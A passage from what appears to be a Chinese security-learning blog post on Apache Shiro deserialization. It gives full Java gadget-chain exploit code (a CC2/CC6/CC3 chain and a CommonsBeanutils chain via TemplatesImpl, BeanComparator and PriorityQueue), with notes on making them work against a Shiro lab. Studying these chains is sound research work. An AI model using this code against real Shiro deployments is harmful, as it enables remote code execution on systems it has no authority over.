+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240614232811726.png" alt="image-20240614232811726"></p>
+<p>这里是反序列化抛了异常，说是无法加载invokerTransformer，就是由于shiro无法处理数组导致的，后面再说，比较复杂</p>
+<blockquote>
+<p>但是这里报错的又不太对啊，他是cc的全部类都无法加载，太怪了</p>
+</blockquote>
+<p>所以这里我们就需要改一下链子，改成不用chainedTransformer数组的形式，也就是拼一下链子就好，然后最后要改成<strong>动态类加载执行任意代码的方式</strong></p>
+<p>这里使用<strong>cc2+cc6+cc3</strong>的方式进行拼接</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_ccDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-comment">//cc6</span><br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<span class="hljs-comment">//这里要添加进去templates</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,invokerTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(templates);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>服了这里也没打通，后台直接报错TiedMapEntry都无法加载</p>
+<p>后来我用了p神的环境就能打通了，估计还是cc依赖运行时没有被编译进去</p>
+<p>这是p神的环境：<a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615104853896.png" alt="image-20240615104853896"></p>
+<blockquote>
+<p>打的时候要去掉<strong>JSESSIONID</strong></p>
+</blockquote>
+<h2 id="打CB链"><a href="#打CB链" class="headerlink" title="打CB链"></a>打CB链</h2><p>CB链打的是shiro自带的依赖：commons-beanutils（就是对javabean的增强类），这里注意一下版本是1.8.3的，本地写exp的时候记得版本也要一致，不然会打不通</p>
+<p>下面是一个简单的javaBean的例子</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;aa&quot;</span>);<br>        System.out.println(PropertyUtils.getProperty(person, <span class="hljs-string">&quot;age&quot;</span>));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们可以不需要再去调用get方法来获取属性值，而是直接用PropertyUtils的静态方法来获取</p>
+<p>然后在这处理的过程中就存在反序列化的点，就直接说了反序列化的点就是会调用javaBean的get方法，比如上面的age就会调用<strong>getAge</strong>方法</p>
+<p>我们可以调试跟进去看一下我们传入了name为”age”之后发生了什么</p>
+<p>一路跟进下去，会在一个getSimpleProperty的方法里面获取到javaBean的各种方法，然后会把我们传进去的名字从小写改成大写</p>
+<blockquote>
+<p>而且我们这里不传大写的属性名进去，不然会报错</p>
+</blockquote>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615093151593.png" alt="image-20240615093151593"></p>
+<p>再往下两行，他就获取了读取属性的get方法，然后进行函数调用，获取了age的值</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615093518572.png" alt="image-20240615093518572"></p>
+<p>我们传进去的javaBean最终就会变成我们指定的属性的值然后返回</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615093640915.png" alt="image-20240615093640915"></p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615093725798.png" alt="image-20240615093725798"></p>
+<p>这里其中存在的利用点就是这个get方法的调用</p>
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>这里就跟我们动态类加载任意代码的这个类有关</p>
+<p>它里面有一个<strong>getOutputProperties()<strong>的方法，这个方法的就很符合javaBean的方式，最重要的是它里面还调用了</strong>newTransformer</strong>这个方法</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615094412956.png" alt="image-20240615094412956"></p>
+<p>所以我们只需要传一个<strong>outputProperties</strong>的名字进去就可以调用这个方法，记得这里一定要是<strong>小写</strong>的形式</p>
+<h3 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>接下来就是从<strong>ProperUtils</strong>往上找看谁调用了他的<strong>getProperty</strong>方法</p>
+<p>这里就找到BeanComparator的compare方法</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615094845997.png" alt="image-20240615094845997"></p>
+<p>看一下他的构造方法</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615095155801.png" alt="image-20240615095155801"></p>
+<p>这里也提前说一下，我们需要调用下面的构造方法，而不能调用上面的，因为上面的ComparableComparator是属于Commoms-Collections里面的方法，而shiro自带是没有这个的，我们打了就会报错</p>
+<p>所以这里comparator我们就需要赋值一个java本身就有的而且是继承了序列化接口的类，这里直接用组长视频里面用的那个<strong>AttrCompare</strong>类</p>
+<h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>见到这个compare就很熟悉了，我们的cc2和cc4里面就是利用了PriorityQueue的readObject方法，然后里面调用compare方法的，那链子就基本串起来了</p>
+<p>现在可以来写一个exp</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cc_chain.shiro_cb;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Person person = new Person(10,&quot;aa&quot;);</span><br><span class="hljs-comment">//        System.out.println(PropertyUtils.getProperty(person, &quot;age&quot;));</span><br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br>        <span class="hljs-comment">//CB</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//先传一个没用东西阻断链子执行</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        <span class="hljs-comment">//这里的size要满足要求才能触发调用链执行，这里需要改用添加元素才行，因为我们的templates还没有加入进去</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//然后反射修改回来priorityQueue的值</span><br>        Class p=PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> p.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,beanComparator);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里用了比较懒的改法，直接借用了一下cc4这个类，主要是为了序列化能成功，本地测试无所谓，其他改法调了半天都报错懒得调了。。。</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615103205401.png" alt="image-20240615103205401"></p>
+<p><strong>打一下shiro看看效果</strong></p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615103608867.png" alt="image-20240615103608867"></p>
+<p>可以成功打通</p>
+<blockquote>
+<p>注意这里如果用ysoserial生成的payload打是打不通的，因为他的CB版本和shiro的不一样</p>
+<p>这里用的官方环境没有删掉<strong>JSESSIONID</strong>竟然也通了（</p>
+</blockquote>
+<h3 id="CB链调用图"><a href="#CB链调用图" class="headerlink" title="CB链调用图"></a>CB链调用图</h3><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615001956606.png" alt="image-20240615001956606"></p>
+<h1 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://clowsman.github.io">clown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://clowsman.github.io/2024/06/11/Shiro反序列化/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://clowsman.github.io" target="_blank">clown</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329155057.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/15/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="RMI反序列化"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">RMI反序列化</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/" title="ASM学习"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ASM学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">clown</div><div class="author-info__description">又菜又爱玩</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/clowsman"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/clowsman" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">Shiro介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shrio%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">Shrio环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro550%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">Shiro550漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%9B%BA%E5%AE%9Akey"><span class="toc-number">3.1.</span> <span class="toc-text">寻找固定key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93cc%E9%93%BE"><span class="toc-number">3.2.</span> <span class="toc-text">打cc链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93CB%E9%93%BE"><span class="toc-number">3.3.</span> <span class="toc-text">打CB链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.3.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BeanComparator"><span class="toc-number">3.3.2.</span> <span class="toc-text">BeanComparator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PriorityQueue"><span class="toc-number">3.3.3.</span> <span class="toc-text">PriorityQueue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CB%E9%93%BE%E8%B0%83%E7%94%A8%E5%9B%BE"><span class="toc-number">3.3.4.</span> <span class="toc-text">CB链调用图</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro721"><span class="toc-number">4.</span> <span class="toc-text">Shiro721</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="Linux提权-信息搜集"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015041.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux提权-信息搜集"/></a><div class="content"><a class="title" href="/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="Linux提权-信息搜集">Linux提权-信息搜集</a><time datetime="2024-06-25T11:30:08.000Z" title="发表于 2024-06-25 19:30:08">2024-06-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场二"/></a><div class="content"><a class="title" href="/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二">红日靶场二</a><time datetime="2024-06-22T09:29:33.000Z" title="发表于 2024-06-22 17:29:33">2024-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/15/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="RMI反序列化"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RMI反序列化"/></a><div class="content"><a class="title" href="/2024/06/15/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="RMI反序列化">RMI反序列化</a><time datetime="2024-06-15T09:03:33.000Z" title="发表于 2024-06-15 17:03:33">2024-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Shiro反序列化"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329155057.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro反序列化"/></a><div class="content"><a class="title" href="/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Shiro反序列化">Shiro反序列化</a><time datetime="2024-06-11T12:17:23.000Z" title="发表于 2024-06-11 20:17:23">2024-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/" title="ASM学习"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ASM学习"/></a><div class="content"><a class="title" href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/" title="ASM学习">ASM学习</a><time datetime="2024-06-10T13:39:52.000Z" title="发表于 2024-06-10 21:39:52">2024-06-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By clown</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
